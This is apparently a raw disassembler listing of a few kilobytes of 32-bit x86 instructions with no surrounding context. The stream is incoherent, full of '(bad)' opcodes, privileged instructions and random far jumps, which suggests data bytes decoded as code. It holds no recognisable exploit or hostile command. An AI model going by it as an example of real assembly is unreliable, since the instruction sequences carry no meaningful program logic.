  4196ef:	retf   0x9b08
  4196f2:	xor    edx,0x4c
  4196f5:	pushf  
  4196f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f7:	cld    
  4196f8:	mov    cl,0x8d
  4196fa:	scas   al,BYTE PTR es:[edi]
  4196fb:	cs dec ebp
  4196fd:	cmp    dh,BYTE PTR [eax]
  4196ff:	popa   
  419700:	gs pop eax
  419702:	dec    esp
  419703:	push   0xfffffff5
  419705:	test   DWORD PTR [ebp+eax*4+0x3cbeb56c],ebp
  41970c:	mov    bl,0x56
  41970e:	bound  edx,QWORD PTR [ebx+0x5c86e3b0]
  419714:	jp     0x419774
  419716:	jnp    0x4196b0
  419718:	test   dl,cl
  41971a:	ins    DWORD PTR es:[edi],dx
  41971b:	cs xor ah,al
  41971e:	out    0xf3,al
  419720:	cmp    edi,edx
  419722:	adc    ebp,ecx
  419724:	js     0x4196dc
  419726:	icebp  
  419727:	mov    DWORD PTR [edx],edx
  419729:	dec    edx
  41972a:	sub    eax,0x5ac5e81f
  41972f:	push   ds
  419730:	ret    0xc637
  419733:	test   DWORD PTR [ecx],esp
  419735:	loop   0x4196f0
  419737:	jne    0x41974e
  419739:	push   esi
  41973a:	xor    ch,dl
  41973c:	jb     0x419743
  41973e:	push   ds
  41973f:	pop    es
  419740:	dec    edi
  419741:	xchg   BYTE PTR [edi+0x44577150],bh
  419747:	ret    0x4be3
  41974a:	inc    esi
  41974b:	ins    BYTE PTR es:[edi],dx
  41974c:	shl    DWORD PTR [edx-0x3e],cl
  41974f:	int3   
  419750:	push   cs
  419751:	add    al,BYTE PTR [ebx]
  419753:	push   esi
  419754:	int3   
  419755:	mov    WORD PTR [edi+0x26a2c47f],gs
  41975b:	bound  ebp,QWORD PTR [ecx+0x9c932ac]
  419761:	nop
  419762:	dec    edi
  419763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419764:	loope  0x4197d0
  419766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419767:	arpl   WORD PTR [edi+0x3c],di
  41976a:	and    esi,DWORD PTR [eax]
  41976c:	sbb    dl,BYTE PTR [ebx-0xda8ccf0]
  419772:	mov    BYTE PTR [esi-0x40],ah
  419775:	jl     0x419753
  419777:	pushf  
  419778:	inc    edx
  419779:	adc    ecx,DWORD PTR [esi]
  41977b:	mov    esp,0xc15685bc
  419780:	or     eax,0x769706b6
  419785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419786:	(bad)  
  419787:	repz shl BYTE PTR [esi],0xc2
  41978b:	jmp    0x4197eb
  41978d:	mov    edx,edi
  41978f:	cmp    al,BYTE PTR [ebp+0x29d3f884]
  419795:	xlat   BYTE PTR ds:[ebx]
  419796:	xor    ecx,DWORD PTR [eax+0x6d]
  419799:	pusha  
  41979a:	jg     0x4197b5
  41979c:	scas   al,BYTE PTR es:[edi]
  41979d:	push   ecx
  41979e:	retf   0x8099
  4197a1:	add    DWORD PTR [esi-0x59],0xffffffe8
  4197a5:	rcl    DWORD PTR [ebp-0x7c],1
  4197a8:	nop
  4197a9:	pop    edi
  4197aa:	jp     0x4197c8
  4197ac:	rcr    ah,1
  4197ae:	retf   0x6ed4
  4197b1:	in     al,dx
  4197b2:	outs   dx,DWORD PTR ds:[esi]
  4197b3:	sbb    al,0xdf
  4197b5:	cmp    DWORD PTR [edi],0x634b102a
  4197bb:	lahf   
  4197bc:	adc    al,0x34
  4197be:	test   al,0xfc
  4197c0:	test   eax,0x80d72005
  4197c5:	(bad)  [eax+edi*4-0x7f368324]
  4197cc:	xchg   esp,eax
  4197cd:	cmp    DWORD PTR [ecx],eax
  4197cf:	lods   al,BYTE PTR ds:[esi]
  4197d0:	pop    ds
  4197d1:	call   0x2153:0xd4fa8a76
  4197d8:	(bad)  
  4197d9:	shl    DWORD PTR [ebx+0x3aa0f7f2],1
  4197df:	enter  0x5a44,0xc4
  4197e3:	stc    
  4197e4:	popa   
  4197e5:	fdiv   st(6),st
  4197e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197e8:	pop    ss
  4197e9:	mov    ch,0xde
  4197eb:	mov    BYTE PTR ds:0x7ef4be8e,bh
  4197f1:	les    edi,FWORD PTR [esi]
  4197f3:	pushf  
  4197f4:	cmc    
  4197f5:	and    ebx,0x5feea58d
  4197fb:	std    
  4197fc:	fisttp QWORD PTR [edi-0x67491a78]
  419802:	sub    bh,BYTE PTR [ecx+0x46]
  419805:	cmp    DWORD PTR ds:0xdfeada5e,esp
  41980b:	add    eax,0x253b9439
  419810:	push   esp
  419811:	imul   ecx,DWORD PTR [ebp-0x76400fcc],0xffffffc9
  419818:	fwait
  419819:	cli    
  41981a:	sbb    DWORD PTR ds:0xbaf6f215,0x2f
  419822:	ss jg  0x419826
  419825:	les    ebp,FWORD PTR [esi+0x53]
  419828:	sbb    dh,BYTE PTR [ebx-0x6812c521]
  41982e:	or     al,0xae
  419830:	je     0x419899
  419832:	imul   esp,DWORD PTR [ecx+0x647c637f],0x2a
  419839:	pop    ebp
  41983a:	sbb    al,0x84
  41983c:	loope  0x419843
  41983e:	xchg   ecx,eax
  41983f:	bnd jle 0x419833
  419842:	add    eax,0x7b4a972
  419847:	and    al,0x68
  419849:	xor    DWORD PTR [eax],ebp
  41984b:	rcl    ah,1
  41984d:	inc    edx
  41984e:	in     al,dx
  41984f:	xchg   ecx,eax
  419850:	(bad)
  419853:	es mov dl,0xa3
  419856:	dec    eax
  419857:	pop    ebx
  419858:	dec    eax
  419859:	adc    DWORD PTR [ecx],0x564c1f4e
  41985f:	xchg   esi,eax
  419860:	ret    
  419861:	into   
  419862:	xor    esi,eax
  419864:	mov    dh,0x8a
  419866:	lods   eax,DWORD PTR ds:[esi]
  419867:	sub    dl,BYTE PTR [eax+0x42]
  41986a:	es xor ecx,eax
  41986d:	shr    DWORD PTR [ebx],cl
  41986f:	jnp    0x4198c8
  419871:	clc    
  419872:	loop   0x41988c
  419874:	aas    
  419875:	in     al,dx
  419876:	xchg   edx,eax
  419877:	js     0x419883
  419879:	fimul  WORD PTR [ebx+esi*2]
  41987c:	mov    ch,0xd
  41987e:	sahf   
  41987f:	inc    esi
  419880:	dec    esi
  419881:	cs ja  0x4198f4
  419884:	push   ebp
  419885:	in     eax,0xc7
  419887:	retf   
  419888:	test   eax,0x1596a40e
  41988d:	jge    0x41980f
  41988f:	nop
  419890:	sbb    ecx,edi
  419892:	fnstcw WORD PTR [edx]
  419894:	shr    BYTE PTR [edi-0x603898ce],cl
  41989a:	dec    ebx
  41989b:	add    DWORD PTR ds:0x3fc1a693,esi
  4198a1:	pop    esi
  4198a2:	mov    edi,0xad3ca2d1
  4198a7:	sub    ebp,DWORD PTR [ebp+0x6ca3d962]
  4198ad:	(bad)  
  4198af:	into   
  4198b0:	push   ebp
  4198b1:	aas    
  4198b2:	adc    DWORD PTR [edi+ebx*2+0x0],edx
  4198b6:	cs pushf 
  4198b8:	out    0x9f,eax
  4198ba:	loope  0x4198ba
  4198bc:	outs   dx,BYTE PTR ds:[esi]
  4198bd:	pop    ecx
  4198be:	mov    eax,ds:0xb8bf6f66
  4198c3:	push   0x38b75bcf
  4198c8:	out    dx,al
  4198c9:	mov    WORD PTR [esi],ss
  4198cb:	int    0x74
  4198cd:	shr    DWORD PTR [esi+eiz*1-0x6b],cl
  4198d1:	pop    esp
  4198d2:	cwde   
  4198d3:	dec    ecx
  4198d4:	std    
  4198d5:	inc    esp
  4198d6:	enter  0x7ee5,0xe8
  4198da:	push   eax
  4198db:	mov    esp,0x2d6c198a
  4198e0:	push   esp
  4198e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198e2:	dec    ecx
  4198e3:	imul   ebx,DWORD PTR [ecx+0x2b],0x3ef726e9
  4198ea:	pusha  
  4198eb:	pop    ax
  4198ed:	into   
  4198ee:	pop    eax
  4198ef:	inc    eax
  4198f0:	mov    ds:0x24bd756a,eax
  4198f5:	or     BYTE PTR [eax-0x354721ca],bl
  4198fb:	cmp    bl,BYTE PTR [ebx]
  4198fd:	xor    al,0x5d
  4198ff:	mov    gs,WORD PTR [edi-0xe]
  419902:	add    al,0x43
  419904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419905:	dec    ebp
  419906:	test   ah,ch
  419908:	popf   
  419909:	add    al,0xb5
  41990b:	or     bh,bh
  41990d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990e:	outs   dx,DWORD PTR ds:[esi]
  41990f:	sbb    BYTE PTR [ebx-0x4f1c7b70],dh
  419915:	lock xor edi,edx
  419918:	gs aam 0x8
  41991b:	inc    ecx
  41991c:	and    BYTE PTR [ebp+ebx*2-0x55],ch
  419920:	(bad)  
  419922:	pop    edi
  419923:	loop   0x41999c
  419925:	push   eax
  419926:	mov    edx,es
  419928:	test   eax,0xbedfd3bb
  41992d:	pop    ds
  41992e:	ret    0xbaf7
  419931:	(bad)  
  419932:	xchg   ecx,eax
  419933:	fdivr  st,st(7)
  419935:	int3   
  419936:	jmp    0x4198e6
  419938:	push   edx
  419939:	pop    es
  41993a:	jns    0x4199b9
  41993c:	sub    eax,0xc9aae1b1
  419941:	cmp    eax,0x6e4b8659
  419946:	bound  esi,QWORD PTR [ebp-0xb]
  419949:	popa   
  41994a:	dec    esi
  41994b:	imul   ebx,DWORD PTR [edi-0x52],0x1d
  41994f:	push   ds
  419950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419951:	cmp    DWORD PTR [edi],ebp
  419953:	pop    esp
  419954:	jecxz  0x419930
  419956:	data16 mov BYTE PTR [edi-0x50d008dc],bh
  41995d:	neg    BYTE PTR [edi-0x620fe373]
  419963:	adc    ecx,edi
  419965:	cwde   
  419966:	xor    esp,DWORD PTR [esi+0x54a07c5]
  41996c:	in     al,0x68
  41996e:	imul   ebx,ecx,0xb7cc3316
  419974:	or     ecx,ecx
  419976:	xchg   esi,eax
  419977:	test   DWORD PTR [edx+0x3e],0x2ebe7454
  41997e:	inc    edi
  41997f:	stos   BYTE PTR es:[edi],al
  419980:	leave  
  419981:	mov    al,ds:0xa2064bea
  419986:	jae    0x41996a
  419988:	fcomp  QWORD PTR [edx+0x29]
  41998b:	lea    ebp,[edi+ecx*8]
  41998e:	retf   0x5e6b
  419991:	jno    0x4199bb
  419993:	addr16 jbe 0x419920
  419996:	add    dh,BYTE PTR [ecx-0x39]
  419999:	ss das 
  41999b:	inc    edi
  41999c:	fist   WORD PTR [esi+edx*1]
  41999f:	or     ecx,esp
  4199a1:	in     eax,dx
  4199a2:	pop    eax
  4199a3:	pop    ds
  4199a4:	scas   eax,DWORD PTR es:[edi]
  4199a5:	mov    al,0xd
  4199a7:	or     eax,0xaa64122a
  4199ac:	sub    al,al
  4199ae:	fcmovu st,st(0)
  4199b0:	rol    BYTE PTR [edi+ecx*2],cl
  4199b3:	cmp    al,0x3b
  4199b5:	mov    ah,0x8b
  4199b7:	or     BYTE PTR [edx+0x651e43c0],bl
  4199bd:	ins    BYTE PTR es:[edi],dx
  4199be:	aad    0xaf
  4199c0:	jge    0x419a14
  4199c2:	jbe    0x4199a5
  4199c4:	jmp    0x41997e
  4199c6:	jns    0x419a1d
  4199c8:	jmp    0x25a638b7
  4199cd:	retf   0xc911
  4199d0:	cmp    ebp,esp
  4199d2:	mov    al,ds:0x68070ae6
  4199d7:	in     al,dx
  4199d8:	test   DWORD PTR [edi+0x70],eax
  4199db:	into   
  4199dc:	cmp    esi,DWORD PTR [ebp-0x1f74493f]
  4199e2:	mov    ah,0xd8
  4199e4:	ss push esi
  4199e6:	cs and al,0x86
  4199e9:	pop    eax
  4199ea:	push   ecx
  4199eb:	arpl   ax,si
  4199ed:	cmp    eax,0x92b21623
  4199f2:	push   esp
  4199f3:	mov    ch,0xb6
  4199f5:	dec    ecx
  4199f6:	push   ebp
  4199f7:	sbb    DWORD PTR [eax+0x5b0e52ab],esi
  4199fd:	adc    BYTE PTR [ebx+0x42ff1075],ah
  419a03:	xor    eax,0x5160a207
  419a08:	sub    bh,ch
  419a0a:	bound  eax,QWORD PTR [ecx]
  419a0c:	sar    cl,1
  419a0e:	mov    bl,0x60
  419a10:	retf   0x2401
  419a13:	je     0x419a2d
  419a15:	mov    DWORD PTR [edx-0x78be5209],ecx
  419a1b:	push   ecx
  419a1c:	loopne 0x4199dd
  419a1e:	inc    ecx
  419a1f:	sub    cl,BYTE PTR [edx+0x7679ff45]
  419a25:	cs std 
  419a27:	adc    DWORD PTR [eax+0x3],edi
  419a2a:	loop   0x419a66
  419a2c:	scas   eax,DWORD PTR es:[edi]
  419a2d:	sub    al,0x2
  419a2f:	pop    eax
  419a30:	enter  0x683d,0xe6
  419a34:	out    dx,al
  419a35:	jo     0x419a79
  419a37:	out    0xe9,al
  419a39:	lahf   
  419a3a:	cmp    BYTE PTR [edx-0x5a],cl
  419a3d:	fs pop ecx
  419a3f:	pop    es
  419a40:	adc    eax,edx
  419a42:	aas    
  419a43:	pushf  
  419a44:	rol    DWORD PTR [edi],1
  419a46:	adc    esp,DWORD PTR [edi+0x7baea351]
  419a4c:	lock xlat BYTE PTR ds:[ebx]
  419a4e:	test   ebx,eax
  419a50:	rcl    DWORD PTR [esi+eax*2-0x44],1
  419a54:	outs   dx,BYTE PTR ds:[esi]
  419a55:	xor    DWORD PTR [edx+edx*4],ecx
  419a58:	xchg   ecx,eax
  419a59:	leave  
  419a5a:	sub    al,BYTE PTR [edi-0x8]
  419a5d:	mov    bl,0x32
  419a5f:	shr    esp,0x6
  419a62:	les    eax,FWORD PTR [ecx-0x48]
  419a65:	cmp    al,0x9
  419a67:	stos   BYTE PTR es:[edi],al
  419a68:	retf   0x1682
  419a6b:	inc    ebp
  419a6c:	das    
  419a6d:	xchg   ebx,eax
  419a6e:	jae    0x419a95
  419a70:	popa   
  419a71:	jo     0x419a5b
  419a73:	ss popf 
  419a75:	pop    edi
  419a76:	dec    eax
  419a77:	or     dh,dl
  419a79:	ja     0x419a32
  419a7b:	adc    bl,BYTE PTR [esp+edx*2-0x2542b397]
  419a82:	push   esp
  419a83:	scas   al,BYTE PTR es:[edi]
  419a84:	les    ebx,FWORD PTR [ebx+0x21dc76f0]
  419a8a:	ins    DWORD PTR es:[edi],dx
  419a8b:	rol    DWORD PTR [ecx-0x72],cl
  419a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a8f:	cwde   
  419a90:	inc    edx
  419a91:	scas   eax,DWORD PTR es:[edi]
  419a92:	out    0x87,al
  419a94:	mov    esp,es
  419a96:	add    eax,0x29449eda
  419a9b:	inc    ecx
  419a9c:	cld    
  419a9d:	add    cl,al
  419a9f:	pop    ss
  419aa0:	ss pusha 
  419aa2:	jae    0x419b23
  419aa4:	jno    0x419a7a
  419aa6:	add    DWORD PTR [edi-0x8],esp
  419aa9:	rcr    DWORD PTR [esi-0x27],cl
  419aac:	dec    esp
  419aad:	pop    edi
  419aae:	adc    eax,0x70141f85
  419ab3:	(bad)  [edx+0x69]
  419ab6:	add    dh,BYTE PTR [edi+edi*4-0x21c5c428]
  419abd:	mov    bl,0x53
  419abf:	mov    esp,DWORD PTR [ebp-0x2f]
  419ac2:	mov    DWORD PTR [esi-0x730570f1],eax
  419ac8:	in     al,dx
  419ac9:	mov    eax,0xeeff2f1f
  419ace:	test   BYTE PTR [eax-0x1d6531e8],0xa
  419ad5:	data16 arpl dx,bp
  419ad8:	xchg   DWORD PTR [esi+0x59f72e0d],ebx
  419ade:	in     eax,dx
  419adf:	xchg   bl,cl
  419ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ae2:	shr    BYTE PTR [ecx-0x62],1
  419ae5:	jo     0x419ac0
  419ae7:	fwait
  419ae8:	lods   al,BYTE PTR ds:[esi]
  419ae9:	jmp    0x7ef6:0x6c4a64b0
  419af0:	sub    al,BYTE PTR [eax+esi*4]
  419af3:	mov    DWORD PTR [eax],edx
  419af5:	not    DWORD PTR [eax-0x63778c0e]
  419afb:	add    BYTE PTR [ecx-0x59],cl
  419afe:	stos   DWORD PTR es:[edi],eax
  419aff:	jl     0x419b57
  419b01:	sbb    ebx,DWORD PTR [esi+0x3f]
  419b04:	sbb    BYTE PTR ds:0x5d7b778c,dl
  419b0a:	dec    ecx
  419b0b:	inc    edx
  419b0c:	xchg   ecx,eax
  419b0d:	jle    0x419b79
  419b0f:	icebp  
  419b10:	inc    eax
  419b11:	jmp    0xb7bb4301
  419b16:	shr    DWORD PTR [edx],cl
  419b18:	adc    BYTE PTR [ebp+ebp*2-0x529a29f2],0x72
  419b20:	cs (bad) 
  419b23:	sub    BYTE PTR [edx+0x24],dl
  419b26:	xlat   BYTE PTR ds:[ebx]
  419b27:	xchg   BYTE PTR [ebp-0x63ccb65a],bh
  419b2d:	cmp    DWORD PTR [esi+0x4a5b4658],ebp
  419b33:	icebp  
  419b34:	or     al,0x42
  419b36:	leave  
  419b37:	hlt    
  419b38:	push   0x61a87a50
  419b3d:	pusha  
  419b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b3f:	repz daa 
  419b41:	lea    ecx,[ebx+0x101dddee]
  419b47:	sahf   
  419b48:	outs   dx,BYTE PTR ds:[esi]
  419b49:	lods   al,BYTE PTR ds:[esi]
  419b4a:	fwait
  419b4b:	and    bh,dl
  419b4d:	inc    ecx
  419b4e:	jns    0x419ae5
  419b50:	nop
  419b51:	mov    esi,DWORD PTR [ebx]
  419b53:	inc    BYTE PTR [eax+esi*4+0x4e]
  419b57:	test   BYTE PTR [edx+ebp*4+0x42],ah
  419b5b:	xchg   ebp,eax
  419b5c:	dec    ecx
  419b5d:	and    esi,0x5a
  419b60:	pop    esi
  419b61:	xor    BYTE PTR [edx+0x4b],0xd9
  419b65:	int3   
  419b66:	add    DWORD PTR [ebx],eax
  419b68:	push   edi
  419b69:	sub    DWORD PTR [esi+eiz*4-0x694c0b19],esi
  419b70:	in     al,0xee
  419b72:	call   0x21f0ef77
  419b77:	inc    esi
  419b78:	jb     0x419b44
  419b7a:	or     DWORD PTR [ebx-0x15],ebp
  419b7d:	imul   DWORD PTR [ebx+0x2f]
  419b80:	enter  0xd268,0x2e
  419b84:	(bad)  
  419b85:	(bad)  
  419b86:	mov    edx,DWORD PTR [ecx]
  419b88:	jmp    0x4842:0xbbde3bfb
  419b8f:	in     eax,0xb4
  419b91:	pushf  
  419b92:	sti    
  419b93:	or     al,0xe1
  419b95:	push   esi
  419b96:	ins    BYTE PTR es:[edi],dx
  419b97:	and    eax,edi
  419b99:	mov    eax,0xc5e46ec5
  419b9e:	mov    ebx,0xbb60c2e7
  419ba3:	icebp  
  419ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ba5:	arpl   WORD PTR cs:[ebp+0x61],cx
  419ba9:	popa   
  419baa:	dec    eax
  419bab:	or     ah,BYTE PTR [eax+edx*1+0x1cfc6764]
  419bb2:	dec    eax
  419bb3:	rol    DWORD PTR [edx],1
  419bb5:	inc    esp
  419bb6:	enter  0xd2ad,0x33
  419bba:	and    esp,DWORD PTR ds:0xc1e460ca
  419bc0:	pop    esp
  419bc1:	ret    
  419bc2:	neg    BYTE PTR [eax+0x49]
  419bc5:	adc    DWORD PTR [eax-0x4d79194b],edi
  419bcb:	inc    ebx
  419bcc:	adc    dl,0x51
  419bcf:	popa   
  419bd0:	(bad)  
  419bd1:	repnz xor al,0x87
  419bd4:	aad    0x3
  419bd6:	adc    eax,0x768fc9cc
  419bdb:	cld    
  419bdc:	xor    edx,DWORD PTR [esi]
  419bde:	mov    al,ds:0xd6a82124
  419be3:	cmp    eax,0x982490a1
  419be8:	xchg   DWORD PTR [edx],esp
  419bea:	mov    ch,0xc8
  419bec:	scas   eax,DWORD PTR es:[edi]
  419bed:	aas    
  419bee:	pop    ebp
  419bef:	jo     0x419c10
  419bf1:	xlat   BYTE PTR ds:[ebx]
  419bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bf3:	shl    BYTE PTR [edi+ebx*2+0x5b41166a],1
  419bfa:	pop    esi
  419bfb:	je     0x419bae
  419bfd:	xchg   esi,eax
  419bfe:	xor    ah,BYTE PTR [ebx]
  419c00:	cs sub esp,ebx
  419c03:	inc    edx
  419c04:	mov    bl,0x45
  419c06:	jne    0x419be2
  419c08:	xchg   DWORD PTR [ecx],esi
  419c0a:	cwde   
  419c0b:	clc    
  419c0c:	inc    esi
  419c0d:	loop   0x419c7a
  419c0f:	mov    ?,edx
  419c11:	lds    edx,FWORD PTR [edx+0x8]
  419c14:	mov    edx,0x285afc6d
  419c19:	(bad)  
  419c1a:	stc    
  419c1b:	test   eax,0x6acb98e4
  419c20:	xor    ebx,esp
  419c22:	into   
  419c23:	mov    ch,0x56
  419c25:	and    ebx,esi
  419c27:	int3   
  419c28:	(bad)  
  419c29:	rcl    ecx,1
  419c2b:	aam    0xee
  419c2d:	push   edx
  419c2e:	mov    dh,0xdd
  419c30:	jmp    0x419c32
  419c32:	pop    edi
  419c33:	jne    0x419c0e
  419c35:	dec    ebx
  419c36:	xchg   esp,eax
  419c37:	pusha  
  419c38:	mov    edi,0x37b847ae
  419c3d:	push   ecx
  419c3e:	cmp    DWORD PTR [ebx-0x4b],0x23364cf1
  419c45:	std    
  419c46:	cmp    bh,bh
  419c48:	addr16 mov ds:0xb04,eax
  419c4c:	pop    eax
  419c4d:	fadd   QWORD PTR [edx-0x9]
  419c50:	xchg   ecx,eax
  419c51:	iret   
  419c52:	cmc    
  419c53:	repz xchg ebp,eax
  419c55:	lods   eax,DWORD PTR ds:[esi]
  419c56:	int    0xbe
  419c58:	dec    eax
  419c59:	push   ds
  419c5a:	mov    ebp,0xf7c840e0
  419c5f:	jmp    0x419cb1
  419c61:	int3   
  419c62:	in     eax,dx
  419c63:	into   
  419c64:	sub    BYTE PTR [ebx+0x38f40648],al
  419c6a:	dec    ebx
  419c6b:	dec    ebx
  419c6c:	inc    esi
  419c6d:	lds    ecx,FWORD PTR [ebx-0xa1711a9]
  419c73:	jnp    0x419cbf
  419c75:	inc    ebp
  419c76:	add    BYTE PTR [ebx+0x3a],al
  419c79:	jne    0x419cdf
  419c7b:	adc    BYTE PTR [esi+0x6df9eac1],dh
  419c81:	call   0xa3cc1a28
  419c86:	hlt    
  419c87:	or     cl,BYTE PTR ds:[ecx]
  419c8a:	into   
  419c8b:	adc    al,0x16
  419c8d:	push   es
  419c8e:	lock sub al,0xdc
  419c91:	dec    edx
  419c92:	pop    eax
  419c93:	inc    esi
  419c94:	rcl    DWORD PTR [esi],cl
  419c96:	icebp  
  419c97:	into   
  419c98:	es jl  0x419c94
  419c9b:	or     ebp,edx
  419c9d:	in     al,0x77
  419c9f:	jle    0x419c37
  419ca1:	out    dx,eax
  419ca2:	or     DWORD PTR [edi-0x74185a24],ecx
  419ca8:	pusha  
  419ca9:	and    al,0x67
  419cab:	jp     0x419c3c
  419cad:	(bad)  
  419cae:	in     eax,0xc3
  419cb0:	out    0x5a,al
  419cb2:	mov    bh,0xdd
  419cb4:	dec    esp
  419cb5:	jno    0x419cbb
  419cb7:	mov    esi,0x4c0b345c
  419cbc:	cmp    BYTE PTR [ecx-0x37],ch
  419cbf:	jg     0x419ce6
  419cc1:	adc    bl,BYTE PTR [esi+0x26]
  419cc4:	xor    esi,0x139cb434
  419cca:	jo     0x419ce2
  419ccc:	mov    edi,0x2ce81fb3
  419cd1:	xchg   esi,eax
  419cd2:	cmp    ebp,edi
  419cd4:	ror    eax,cl
  419cd6:	push   esi
  419cd7:	and    al,BYTE PTR [ecx+0x6969b0f2]
  419cdd:	add    DWORD PTR [esp+esi*8+0x7a],ebx
  419ce1:	add    DWORD PTR [esi+0x1f55f7cf],edx
  419ce7:	or     eax,esp
  419ce9:	fbld   TBYTE PTR [ebp-0x20]
  419cec:	xchg   esi,eax
  419ced:	sti    
  419cee:	cmp    eax,0x6baf01
  419cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cf4:	jno    0x419ce3
  419cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cf7:	rcl    BYTE PTR [esi+0x4d6b43c8],1
  419cfd:	or     bh,BYTE PTR [eax]
  419cff:	xchg   esp,eax
  419d00:	pop    edi
  419d01:	stos   BYTE PTR es:[edi],al
  419d02:	mov    dh,BYTE PTR [ebx-0x3]
  419d05:	out    0x8c,eax
  419d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d08:	push   edi
  419d09:	(bad)  
  419d0a:	stc    
  419d0b:	pop    esi
  419d0c:	adc    DWORD PTR [edx],eax
  419d0e:	adc    esi,DWORD PTR [esi-0x59964112]
  419d14:	push   0xe
  419d16:	outs   dx,DWORD PTR ds:[esi]
  419d17:	fdivr  st,st(3)
  419d19:	fdiv   st(0),st
  419d1b:	xor    DWORD PTR [esi+0x6cb76d2c],edi
  419d21:	inc    BYTE PTR [esi-0x4]
  419d24:	mov    cl,0x17
  419d26:	(bad)  
  419d27:	xor    ebp,DWORD PTR [ecx-0x3b]
  419d2a:	retf   0xbe8f
  419d2d:	or     BYTE PTR [edx+ecx*2],ah
  419d30:	dec    ecx
  419d31:	dec    ecx
  419d32:	dec    edi
  419d33:	push   ebx
  419d34:	lods   eax,DWORD PTR ds:[esi]
  419d35:	add    eax,edx
  419d37:	inc    edi
  419d38:	push   edi
  419d39:	cwde   
  419d3a:	xchg   BYTE PTR [ebx-0x5229faa0],dl
  419d40:	fwait
  419d41:	rcr    BYTE PTR [edx+0x67],1
  419d44:	cwde   
  419d45:	cmp    bl,dh
  419d47:	ret    
  419d48:	fcom   QWORD PTR [edx-0x95d4825]
  419d4e:	dec    edx
  419d4f:	(bad)  
  419d50:	lahf   
  419d51:	(bad)  
  419d52:	shl    DWORD PTR [ebp-0x298ddcea],1
  419d58:	xchg   edi,eax
  419d59:	test   BYTE PTR [ecx-0x2c],al
  419d5c:	sti    
  419d5d:	or     al,0xdc
  419d5f:	fmulp  st(4),st
  419d61:	xchg   esi,eax
  419d62:	dec    ebx
  419d63:	mov    ebx,0xd874ad23
  419d68:	out    0x8,al
  419d6a:	cdq    
  419d6b:	jle    0x419d02
  419d6d:	cld    
  419d6e:	cmp    eax,0x5fac2b77
  419d73:	retf   
  419d74:	into   
  419d75:	mov    dh,0xcf
  419d77:	sbb    eax,0xae0f91d
  419d7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d7e:	xchg   esp,eax
  419d7f:	aad    0x6d
  419d81:	or     bh,BYTE PTR [ebp+0x7]
  419d84:	ror    BYTE PTR [edx-0x50],cl
  419d87:	adc    eax,0x936ae27f
  419d8c:	sbb    edx,esi
  419d8e:	and    DWORD PTR [edi-0x295cb2f1],eax
  419d94:	push   eax
  419d95:	adc    eax,0x51cb86f0
  419d9a:	add    DWORD PTR [esi+0x6214fb7f],0xffffffe8
  419da1:	pop    ecx
  419da2:	xchg   ecx,eax
  419da3:	inc    edx
  419da4:	sub    BYTE PTR [ecx],cl
  419da6:	pop    esp
  419da7:	inc    ebx
  419da8:	inc    edi
  419da9:	pushf  
  419daa:	push   ss
  419dab:	jp     0x419d51
  419dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dae:	pusha  
  419daf:	stos   DWORD PTR es:[edi],eax
  419db0:	mov    eax,DWORD PTR [ecx+0x3f]
  419db3:	jae    0x419d3e
  419db5:	inc    eax
  419db6:	ins    DWORD PTR es:[edi],dx
  419db7:	shl    DWORD PTR [edx+0x6bed761a],cl
  419dbd:	adc    BYTE PTR [esi-0x25c10afe],al
  419dc3:	xchg   esp,eax
  419dc4:	std    
  419dc5:	ins    BYTE PTR es:[edi],dx
  419dc6:	into   
  419dc7:	ins    DWORD PTR es:[edi],dx
  419dc8:	mov    ecx,0x802c99f
  419dcd:	xor    al,0xd8
  419dcf:	jecxz  0x419e32
  419dd1:	arpl   WORD PTR [ebx+0x35],si
  419dd4:	mov    esi,0x2a215c8b
  419dd9:	lahf   
  419dda:	adc    DWORD PTR [ecx+eax*2-0x618e3a24],eax
  419de1:	icebp  
  419de2:	std    
  419de3:	aaa    
  419de4:	and    al,0xfc
  419de6:	and    al,0x7c
  419de8:	add    ah,BYTE PTR [ebx-0x72]
  419deb:	pop    esp
  419dec:	test   BYTE PTR [edi+0x5b9bda36],bh
  419df2:	sub    dl,BYTE PTR [ebx]
  419df4:	jg     0x419e09
  419df6:	cli    
  419df7:	xor    BYTE PTR ds:0xbcbbc264,cl
  419dfd:	loop   0x419dea
  419dff:	scas   al,BYTE PTR es:[edi]
  419e00:	pop    ebp
  419e01:	stos   DWORD PTR es:[edi],eax
  419e02:	inc    eax
  419e03:	imul   esi,DWORD PTR [esi],0xa2fdca32
  419e09:	lods   eax,DWORD PTR ds:[esi]
  419e0a:	repz retf 
  419e0c:	fucomp st(2)
  419e0e:	jecxz  0x419de0
  419e10:	bound  esp,QWORD PTR [ecx+0x2e317034]
  419e16:	xor    dl,BYTE PTR [eax-0x54c21da5]
  419e1c:	lds    edi,FWORD PTR [ebp+0x46]
  419e1f:	and    BYTE PTR [eax-0x58],0xfe
  419e23:	in     eax,dx
  419e24:	ja     0x419dc8
  419e26:	lds    edi,FWORD PTR [esi-0x5a]
  419e29:	ins    BYTE PTR es:[edi],dx
  419e2a:	clc    
  419e2b:	rol    BYTE PTR [eax],0x2f
  419e2e:	jns    0x419e34
  419e30:	fdiv   DWORD PTR [eax+0x77e2dca4]
  419e36:	push   0x790d45e9
  419e3b:	outs   dx,WORD PTR ds:[esi]
  419e3d:	lods   al,BYTE PTR ds:[esi]
